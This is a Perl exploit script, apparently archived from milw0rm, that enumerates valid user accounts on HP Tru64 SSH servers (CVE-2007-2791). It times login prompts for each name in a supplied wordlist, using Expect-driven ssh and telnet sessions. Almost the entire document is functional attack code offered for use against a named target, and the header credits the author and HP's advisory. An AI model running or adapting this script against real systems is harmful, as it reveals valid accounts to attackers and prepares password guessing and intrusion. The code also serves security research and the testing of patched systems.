#!/usr/bin/perl
use warnings;
use strict;
#
# Remember: you need to accept ssh key first!
#
use Tie::File;
use Fcntl 'O_RDONLY';
use Expect;
use Time::HiRes qw(gettimeofday);
#
# tru64-sshenum.pl
# HP Tru64 Remote Secure Shell user enumeration exploit (CVE-2007-2791).
#
# Author: Andrea "bunker" Purificato
# http://rawlab.mindcreations.com
#
# The following supported software versions are affected:
#
#  HP Tru64 UNIX v5.1B-4
#  HP Tru64 UNIX v5.1B-3
# 
# The Hewlett-Packard Company thanks Andrea Purificato for reporting this 
# vulnerability to security-alert@hp.com
#
# References: 
#  - http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?lang=en&cc=us&objectID=c01007552
#  - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2791
#  - http://rawlab.mindcreations.com/codes/exp/nix/tru64-sshenum.pl
#

my $verbose = undef;
my $port    = 22;
my $timeout = 10;

print <<BANNER;
$0 - HP Tru64 Remote Secure Shell user enumeration exploit

 Andrea "bunker" Purificato - http://rawlab.mindcreations.com
 37F1 A7A1 BB94 89DB A920  3105 9F74 7349 AF4C BFA2 

BANNER

print "Usage: $0 <target> <userlist>\n" and exit(-1) if ($#ARGV<1);

my $target   = $ARGV[0];
my $wordlist = $ARGV[1];
chomp (my $ssh  = `which ssh`);
chomp (my $tel  = `which telnet`);
my %htimes; my @atimes;

print "[+] Grabbing banner...\n";
my $exp = Expect->spawn("$tel -l fake $target $port") 
	or die "Cannot spawn $tel: $!\n";;
#$exp->log_stdout(0);
$exp->expect(5,['SSH|ssh'=>sub{$exp->send(".\n")}]);
$exp->close();
print "[+] Done!\n\n";

sub timing {
    my $user = shift @_;
    my $t0 = gettimeofday;
    my $t1 = undef;
    my $exp = Expect->spawn("$ssh -l $user -p $port $target") 
	or die "Cannot spawn $ssh: $!\n";;
    $exp->log_stdout(0);
    $exp->expect($timeout,['assword:'=>sub{$exp->send(".\n")}]);
    $exp->expect(undef,   [ qr'assword|denied'=>sub{$t1=gettimeofday}]);
    $t1 = gettimeofday unless ($t1);
    $exp->close();
    return sprintf "%0.3f", ($t1-$t0);
}

tie my @wlst_ln, 'Tie::File', "$wordlist", mode=>O_RDONLY
    or die "$wordlist: $!";

print "[+] Started, please wait: ";
for (@wlst_ln) {
    print "($_ dup?)" if ($htimes{$_});
    my $ret = timing($_);
    $htimes{$_} = $ret unless ($htimes{$_});
    push @atimes, $ret;
    unless ($verbose) { print "." }
    else { print "$_\t\t$ret\n" }
}
print " Done!\n\n";

# 
# Do whatever you want with time values:
# 
# (sorted by values)
# 
foreach my $key (sort {$htimes{$b}<=>$htimes{$a}} keys %htimes) {
     print "$key:\t\t$htimes{$key}\n";
}
exit(0);

# milw0rm.com [2007-06-04]
